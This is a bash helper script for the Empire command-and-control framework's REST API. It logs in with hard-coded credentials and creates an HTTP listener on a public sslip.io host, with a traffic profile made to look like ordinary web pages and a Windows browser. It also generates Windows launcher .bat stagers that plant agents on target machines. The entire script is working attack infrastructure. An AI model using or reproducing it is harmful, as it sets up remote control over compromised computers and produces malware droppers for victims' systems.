#!/bin/bash
# Empire REST API Helper Script

API_URL="http://127.0.0.1:1337/api/v2"
TOKEN=""

# Get token (login)
get_token() {
    echo "[+] Getting Empire token..."
    RESPONSE=$(curl -s -X POST "$API_URL/users/login" \
        -H "Content-Type: application/json" \
        -d '{
            "username": "empireadmin",
            "password": "password123"
        }')
    
    TOKEN=$(echo $RESPONSE | jq -r '.access_token')
    
    if [ "$TOKEN" != "null" ] && [ -n "$TOKEN" ]; then
        echo "[+] Token obtained: ${TOKEN:0:20}..."
        echo $TOKEN > .empire_token
        return 0
    else
        echo "[-] Failed to get token"
        echo "Response: $RESPONSE"
        return 1
    fi
}

# Create HTTP listener
create_listener() {
    echo "[+] Creating HTTP listener..."
    
    if [ -z "$TOKEN" ]; then
        TOKEN=$(cat .empire_token 2>/dev/null)
    fi
    
    curl -X POST "$API_URL/listeners/http" \
        -H "Authorization: Bearer $TOKEN" \
        -H "Content-Type: application/json" \
        -d '{
            "Name": "main_http",
            "Host": "https://161-35-155-3.sslip.io",
            "Port": 443,
            "DefaultProfile": "/admin/get.php,/news.php,/login/process.php|Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        }' | jq .
}

# List listeners
list_listeners() {
    echo "[+] Listing listeners..."
    
    if [ -z "$TOKEN" ]; then
        TOKEN=$(cat .empire_token 2>/dev/null)
    fi
    
    curl -s "$API_URL/listeners" \
        -H "Authorization: Bearer $TOKEN" | jq .
}

# Generate stager
generate_stager() {
    STAGER_TYPE=$1
    LISTENER=$2
    OUTPUT=$3
    
    echo "[+] Generating $STAGER_TYPE stager for listener $LISTENER..."
    
    if [ -z "$TOKEN" ]; then
        TOKEN=$(cat .empire_token 2>/dev/null)
    fi
    
    STAGER_DATA=$(curl -s -X POST "$API_URL/stagers/$STAGER_TYPE" \
        -H "Authorization: Bearer $TOKEN" \
        -H "Content-Type: application/json" \
        -d "{
            \"Listener\": \"$LISTENER\",
            \"OutFile\": \"$OUTPUT\"
        }")
    
    echo "$STAGER_DATA" | jq -r '.Output' > "$OUTPUT"
    echo "[+] Stager saved to: $OUTPUT"
}

# Main menu
case "$1" in
    login)
        get_token
        ;;
    listener)
        create_listener
        ;;
    listeners)
        list_listeners
        ;;
    stager)
        generate_stager "$2" "$3" "$4"
        ;;
    *)
        echo "Usage: $0 {login|listener|listeners|stager <type> <listener_name> <output_file>}"
        echo ""
        echo "Examples:"
        echo "  $0 login"
        echo "  $0 listener"
        echo "  $0 listeners"
        echo "  $0 stager windows/launcher_bat main_http ./stagers/launcher.bat"
        ;;
esac
